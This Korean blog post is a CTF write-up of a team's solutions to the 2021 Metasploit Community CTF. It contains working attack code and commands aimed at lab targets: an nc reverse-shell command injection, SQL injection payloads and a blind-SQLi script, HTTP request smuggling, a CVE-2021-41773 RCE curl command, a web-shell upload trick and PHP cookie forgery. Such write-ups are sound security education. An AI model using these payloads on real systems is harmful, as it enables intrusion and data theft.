---
layout		: post
markdown	: kramdown
highlighter	: rouge
title		: "2021 Metasploit Community CTF write-up, review"
date		: 2021-12-07 01:30:00 +0900
category	: R&D
author		: 김도현
author_email: dhkim@stealien.com
background	: /assets/bg.png
profile_image: /assets/2021-01-28-metasploit-ctf-review/profile_image.jpg
summary		: "2021 Metasploit Community CTF write-up, review"
thumbnail	: /assets/stealien.png
lang        : ko
permalink   : /2021-12-07/Metasploit-CTF-Review
---

# 2021 Metasploit Community CTF write-up, review

PoSTLTimes(PostalTimes + STLCTF)이라는 팀명으로 진행했다.

----

## 2 of Clubs, Black Joker

> Solver is **Jang Jaehoon** from **STLCTF**

20000/tcp 포트로 접근 시, 바이너리를 다운 받을 수 있다. 이 바이너리는 타겟 서버의 20001/tcp와 통신하며 타겟 바이너리의 문제를 해결 시 플래그를 받을 수 있다. `strace`를 사용하여 통신하는 규칙을 분석 후, 문제를 해결 할 수 있었다.

바이너리는 서버로부터 `x`, `y` 좌표 값을 받으며 사용자가 이를 클릭 할 시에 서버로 클릭한 좌표 값을 전송한다. 이를 전부 완수하게 될 경우 플래그를 획득할 수 있다.

### Easy Challenge

`json` 형태로 통신한다. 단순히 이 값들을 프로토콜에 맞게 전송 해 주면 된다.

### Hard Challenge

Binary 형태로 통신한다. 해당 binary 값들을 이용하여 문제를 해결 할 수 있다.

----

## 2 of Spades

> Solver is **Dohyun Kim (@d0now)** from **STLCTF**

443/tcp 포트로 접근 시, `Under Construction!`이라는 문구를 발견 할 수 있다. `gobuster`를 이용한 directory scanning으로 `/.git/HEAD` 폴더를 발견 할 수 있었으며, `GitHacker` 프로젝트를 이용하여 레포지토리 정보를 받아 올 수 있다. 

```
$ git cat-file -p 1e4988fd28fdfb4116f7203451e6cf1b6c51ea43
username=root
password=password123
flag_location=3e6f0e21-7faa-429f-8a1d-3f715a520da4.png
```

해당 경로로 접근 시 플래그를 획득할 수 있었다.

----

## 3 of Clubs

> Solver is **Dohyun Kim (@d0now)** from **STLCTF**

30033/tcp 포트로 접근 시 하나의 ELF 프로그램을 획득 할 수 있다. 이 프로그램은 30034/tcp에서 동작하고 있으며, 프로그램을 분석하여 조건을 만족해 플래그를 획득할 수 있었다.

프로그램은 간단한 stack 기반 계산기였으며, 여타 pwnable의 vm 문제와 같이 접근 시 문제를 쉽게 해결할 수 있다.

```python
#!/usr/bin/env python3

from pwn import *

OP_LSH = 0xc0
OP_RSH = 0xc1
OP_MUL = 0xd0
OP_DIV = 0xe0
OP_EXT = 0xff

p = remote("localhost", 31337)

payload  = p16(0x0006)
payload += p16(0x0001)
payload += p8(0x03)
payload += p8(0x17)
payload += p8(0x6d)
payload += p8(OP_MUL) # 0x6d * 0x17 = 2507
payload += p8(OP_DIV) # 2507 / 3 = 835
payload += p8(0x01)
payload += p8(OP_MUL)
payload += p8(0x01)
payload += p8(OP_MUL)
payload += p8(0x01)
payload += p8(OP_MUL)
payload += p8(OP_EXT)
payload += p16(0xadde)

p.send(payload)
p.readuntil(b"\n")
data = p.recvall()
with open('flag.png', 'wb') as f:
    f.write(data)
```

----

## 3 of Hearts

> Solver is **Seokchan Yoon (@ch4n3)** from **STLCTF**

33337/tcp 포트로 접근 시 웹 서비스가 존재한다. 특정한 패킷을 전송하게 되면 `PHPSESSID`를 획득할 수 있고, 이를 이용하여 `/private.php`에 접근하여 플래그를 획득할 수 있다.

```
GET /save.php?first=1 HTTP/1.1
Host: threeofhearts.ctf.net
Content-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Content-Length: 160
Transfer-Encoding: chunked

5f
0

GET /save.php?second=1 HTTP/1.1
Host: threeofhearts.ctf.net
Content-Length: 40
Cookie: 
0

GET /save.php?second=222 HTTP/1.1
X-Access: localhost
```

----

## 4 of Clubs

> Solver is **Dohyun Kim (@d0now)** from **STLCTF**

15010/tcp로 접근 시 웹 서비스가 존재한다. 회원가입 후 파일을 업로드/다운로드 할 수 있다. 다운로드 한 파일은 `/users/[username]/files/[filename]`에 저장 되는데, 아무나 접근이 가능하여 `username`과 `filename`을 스캐닝하여 플래그를 획득할 수 있었다.

```
$ gobuster dir -u http://localhost:31337/users/employee/files/ -c "$RACK_SESSION" -a "$USER_AGENT" -t 32 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:31337/users/employee/files/
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] Cookies:                 rack.session=BAh7CUkiD3Nlc3Npb25faWQGOgZFVG86HVJhY2s6OlNlc3Npb246OlNlc3Npb25JZAY6D0BwdWJsaWNfaWRJIkUxYWY3ZDQyN2FiZTEwZTg4YTMwODNmYTdkNzJmMjBlMzZlY2JhZmMwMGU3MTI3OTM2ZmI3NjEzOWE3NTQxNTI0BjsARkkiCWNzcmYGOwBGSSIxM2RLY0tzdGlYRFBzNVBLVllwWXJQOC9oT0t6bWkxQ1hZVmEvOThWTGU2WT0GOwBGSSINdHJhY2tpbmcGOwBGewZJIhRIVFRQX1VTRVJfQUdFTlQGOwBUSSItYzY5NzEzNGFjMTU4OWNmZjcxZjYwNGE3NTg4ZmIxYTJiMTA5MTI2MwY7AEZJIg11c2VybmFtZQY7AEZJIgphRG1pbgY7AFQ%3D--e346362309c00ead4b73f84b2ae76a89edbed0ae
[+] User Agent:              Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
[+] Timeout:                 10s
===============================================================
2021/12/04 12:50:26 Starting gobuster in directory enumeration mode
===============================================================
/fileadmin            (Status: 200) [Size: 169825]
/reports              (Status: 200) [Size: 23]
/upload               (Status: 403) [Size: 13]

===============================================================
2021/12/04 12:53:43 Finished
===============================================================
```

`fileadmin` 파일이 플래그이다.

----

## 4 of Diamonds

> Solver is **Jaehoon Jang** from **STLCTF**

10010/tcp에 열려있는 웹 페이지의 취약점을 이용하여 문제를 해결할 수 있다.

다음과 같이 로그인 시 user account와 관련된 오브젝트의 정보를 획득 할 수 있다.
```javascript
var current_account = {"id":1,"username":"user","password":"password""role":"user","created_at":"2021-12-06T05:01:12.978Z""updated_at":"2021-12-06T05:01:12.978Z"};    
```

회원가입 시 request packet에 role을 추가하여 문제를 해결할 수 있다.

----

## 4 of Hearts

> Solver is **Dohyun Kim** from **STLCTF**

80/tcp에 접근 시 플래그를 획득할 수 있다.

----

## 5 of Clubs

> Solver is **Dohyun Kim** from **STLCTF**

15000/tcp에 접근 시 다음과 같이 특정한 명령을 내릴 수 있는 콘솔을 사용할 수 있다.
```
$ nc localhost 31337

Welcome to the Student Database Management System!
Time is 2021-12-03 18:03:46 +0000.

Pick one of the following options:
1. Create new student record
2. Show student records
3. Update an existing record
4. Delete student record
5. Exit

Input:
```

1번 메뉴를 통해 새로운 student record를 만들고 4번메뉴에서 올바른 student name을 넣어주고 student surname에서 발생하는 command injection 취약점을 이용하여 문제를 해결할 수 있다.
```
Deleting a student with the following details:
Student name: a
Student surname: a$(nc 172.17.8.84 4444 -e /bin/sh)
Invalid characters entered.

Found student file: a_a$(nc 172.17.8.84 4444 -e /bin/sh).txt
Deleting...
Completed.
```

----

## 5 of Diamonds

> Solver is **Yootaek Lim** from **STLCTF**

11111/tcp에 접근 시 로그인 할 수 있는 웹페이지가 나온다. 사용자명은 admin, 패스워드에 postgresql injection을 통해 공격하여 플래그를 획득할 수 있다.

```
username=admin&password='or+1=1--+-
```

and also we wrote blind sql injection script for it.

```python
#!/usr/bin/env python3

import requests
import argparse
import string

def login(host, port, username, password):

    url = f"http://{host}:{port}/login"
    pay = f"username={username}&password={password}"

    ses = requests.Session()
    req = requests.Request(
        method='POST',
        url=url,
        data=pay,
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )

    pre = req.prepare()
    pre.url = url
    pre.body = pay

    response = ses.send(pre, allow_redirects=False)
    if response.status_code != 303:
        return False # login failed.
    else:
        return True

def run(host, port):
    
    db_name_len = 8
    db_name     = 'postgres'
    table_name  = 'registered_users'

    payload_upper = ''''+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))>{}+--'''
    payload_lower = ''''+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))<{}+--'''
    payload_equal = ''''+or+(select+ascii(substr((select+password+from+registered_users+limit+1+offset+0),{},1)))={}+--'''

    offset = 0
    password = ''

    while not login(host, port, 'admin', payload_equal.format(offset+1, 0)):

        offset += 1
        cmpmin = 0x20
        cmpmid = 0x50
        cmpmax = 0x7f

        while True:

            if login(host, port, 'admin', payload_equal.format(offset, cmpmid)):
                password += chr(cmpmid)
                break

            elif login(host, port, 'admin', payload_upper.format(offset, cmpmid)):
                cmpmin = cmpmid + 1
                cmpmid = (cmpmax + cmpmin) // 2

            elif login(host, port, 'admin', payload_lower.format(offset, cmpmid)):
                cmpmax = cmpmid - 1
                cmpmid = (cmpmax + cmpmin) // 2

            else:
                raise RuntimeError

        print(password)

    return password

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", type=str, default="localhost")
    parser.add_argument("--port", type=int, default=31337)
    args = parser.parse_args()
    result = run(args.host, args.port)
    print("password: " + result, end='')
```

and noticed that admin password is keep changing when revert machine.

----

## 7 of Hearts

> Solver is **Dohyun Kim (@d0now)** from **STLCTF**

15122/tcp로 ssh를 이용하여 접근 할 수 있다. 다만 아무런 credential이 없어서 로그인 하기 위해 몇가지 방법을 시도 해 보았다:

1. Dictionary based brute focing attack
2. Rule based brute forcing attach (root, 1 length word to 3 length word.)
3. Credential stuffing (credentials are from other challeges.)
4. Internal network access via other challenge's reverse shell (maybe docker-compose)
5. Packet capture

하지만 이 중 아무런 성과를 얻지 못했고, 다음과 같이 상황이 흘러가게 되었다.

1. **Jaehoon Jang**님이 DHCP client port가 열려 있는것을 확인 했다 (근데 분명 처음 스캐닝 돌릴 때는 열려있지 않았다.)
2. DHCP client를 속여서 공격하거나, 1-day exploit을 시도 하려고 했다.
3. 몇가지 시도 도중, 타겟 서버의 ip를 kali의 ip로 변경시키려는 시도를 했다. 참고로 arp spoofing, dhcp spoofing 등을 수행했다.
4. 패킷 캡쳐를 수행 했다.
5. 그러자 3~5분 간격으로 kali의 23번 포트에 문제 서버에서 접근하는것을 발견했다.
6. kali의 23/tcp에 telnet 서비스를 열어두고 패킷 캡쳐를 수행했다.
7. 로그인 정보를 획득할 수 있었다.
8. 성공적으로 ssh login에 성공했다.

정말로 당황스러운 문제가 아닐 수 없다... 이 문제 때문에 2등, 3등을 놓쳤다니, 아직도 화가 나는건 사실이다 :(

----

## 8 of Clubs

> Solved by **sickcodes** from **PostalTimes**

20123/tcp로 ssh를 이용하여 접근할 수 있다. `encrypt_flag.py`와 `encrypted_flag` 파일이 존재한다. `encrypt_flag.py` 42번줄의 `return fernet.encrypt(file)`을 `return fernet..decrypt()`로 수정한 후 다음과 같이 문제를 해결할 수 있었다:

```
$ python encrypt_flag.py encrypted_flag out --debug
$ file out
out: PNG image data, 500 x 700, 8-bit/color RGBA, non-interlaced
```

----

## 9 of Diamonds

> Solved by **Jaehon Jang** from **STLCTF**

8080/tcp로 http를 이용하여 접근할 수 있다. admin cookie를 변조하여 문제를 해결할 수 있었다.

----

## 9 of Spades

> Solved by **timwr** from **PostalTimes**

20055/tcp로 http를 이용하여 접근할 수 있다. 파일 업로드를 할 수 있는데, 많은 필터링이 존재한다. 하지만 `.htaccess` 파일을 업로드하여 `.htm` 파일이 php 실행이 가능하도록 수정한 후, `.htm` 웹쉘을 업로드하여 문제를 해결할 수 있었다.

```
AddType application/x-httpd-php .html .htm
```

----

## 10 of Clubs

> Solved by **Dohyun Kim (@d0now)** from **STLCTF**

12380/tcp에 http로 접근이 가능하다. http 버전이 `CVE-2021-41773`에 취약하여 이를 이용하여 RCE를 할 수 있었다.

```
$ curl --path-as-is -v -X POST 'http://localhost:31337/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh' -d "echo;cat /secret/safe/flag.png" -o /tmp/flag.png
```

----

## Jack of Hearts

> Solved by **Seokchan Yoon (@ch4n3)** from **STLCTF**

20022/tcp에 http로 접근이 가능하다. 다음과 같이 user 쿠키를 변조하여 문제를 해결할 수 있었다:
```php
class user {
    function __construct()
    {
        return ;
    }
}

$obj = new user();
$obj->username = "admin";
$obj->admin = false;
$obj->profile_img = "/var/www/html/../../../../../flag.png";

print(serialize($obj) . "\n\n");
print(base64_encode(base64_encode(serialize($obj))));
```
```
$ php serialize.php
O:4:"user":3:{s:8:"username";s:5:"admin";s:5:"admin";b:0;s:11:"profile_img";s:37:"/var/www/html/../../../../../flag.png";}

VHpvME9pSjFjMlZ5SWpvek9udHpPamc2SW5WelpYSnVZVzFsSWp0ek9qVTZJbUZrYldsdUlqdHpPalU2SW1Ga2JXbHVJanRpT2pBN2N6b3hNVG9pY0hKdlptbHNaVjlwYldjaU8zTTZNemM2SWk5MllYSXZkM2QzTDJoMGJXd3ZMaTR2TGk0dkxpNHZMaTR2TGk0dlpteGhaeTV3Ym1jaU8zMD0=
```

----

## Ace of Diamonds

> Solved by **Dohyun Kim (@d0now)** from **STLCTF**

35000/tcp에 http로 접근하게 되면 `capture.pcap` 파일을 획득할 수 있다. 이 파일은 SMB 프로토콜이 캡쳐된것을 확인할 수 있는데, 몇가지 수상한 행동을 한다. 하지만 이는 모두 연막이고 단순히 padding 필드가 존재하는 패킷의 padding 값을 확인해보면 ascii 범위인것을 알 수 있다. 이를 모두 조합하게 되면 다음과 같은 문자열을 획득할 수 있다:
```
Here is the URL you are looking for: /U,rhbjaaCeDseVRQzEO.YsgXXtoGKpvUEkZXaoxurhdYnIlpJiGszZwUktVWTS,DabQAhvbEDQaNL_Dhsq.pposWkG-DtQdIVXNEWd.KbtYXvCek_gJuzIrDtMHfITFL/flag.png
```

해당 경로로 접속하게 되면 플래그를 획득할 수 있다.

별개로, SMB 관리자의 계정은 다음과 같다: Administrator:netntlmv2

----

## Ace of Hearts

> Solved by **Donggyu Kim** from **STLCTF**

20011/tcp로 접근하게 되면 네개의 사용자의 페이지를 볼 수 있는데, 이 중 Sarah의 페이지는 private 설정이 되어 있다. 하지만 밑의 url 검색 기능에서 SSRF가 발생하는데, 이를 이용하여 `/admin`에 접근하게 되면 Sarah의 페이지 권한 설정을 수정할 수 있다. 그리고 Sarah의 페이지로 접근하여 플래그를 획득할 수 있었다.

----

## Review

2년째 영국 친구들(@PostalTime)과 함께하는 metasploit community ctf 되시겠다. 대부분의 문제들이 상식선에 있었지만, 7 of Hearts 문제는 정말 지옥과도 같았다. 1등을 제외하고, 현재 2등, 3등인 팀들과 격차를 꽤 벌려 놓았었는데 결국 해당 문제를 풀지 못하여 4등을 하게 되었다. 7 of Hearts 문제의 경우 나의 주관적인 생각으론, 다른 문제들과 컨셉이 비슷하지 못했다는 점에서 그렇게 잘 만든 문제는 아닌거 같다고 보여진다. 아마도 운이 좋게 dhcp 클라이언트 포트가 열려 있는것을 발견하지 못했다면 대회가 끝날 때 까지 못 풀지 않았을까 생각한다(아이디어의 원천이 되어준 **Jaehoon Jang**님께 감사.)

이번 CTF의 경우 사실 공식적으로 STLCTF란 팀명으로 처음 진행 한 ctf이다. STLCTF는 Stealien의 연구원, Stealien의 인턴(혹은 인턴으로 재직했던 사람), Stealien Security Leader 1기, 2기로 구성되어 있다. 뭔가 빡세게 ctf를 하는 팀은 아니고, 이 그룹에 속해 있으면서 함께 ctf 나갈 기회가 있으면 함께 하는 뭐 그런 자유로운 분위기의 커뮤니티 정도로만 생각 해 주면 되겠다. 가입 의사가 있으면, Discord `PI#5539`로 연락 주길 바란다. 당연하지만 본인의 소속/이름 정도를 간단하게 밝혀주면 좋다 :)

또한 PostalTime도 소개해볼까 한다. PostalTime도 뭔가 열심히 CTF를 하는 팀이라기 보다는 PoC에서 만난 [@tiwmr](https://twitter.com/timwr)을 주요로 활동하는 보안 커뮤니티 같은 느낌이다. (사실 물어보지 않아서 모른다.) 작년의 metasploit ctf 이후로 1년만에 같이 진행 했는데, 작년에는 3위를 한 것과 달리 1등수가 떨어져서 tim한테 미안할 따름이다.

> **총평** : 역시 ctf는 가끔 하는게 정신 건강에 이로운 것 같다.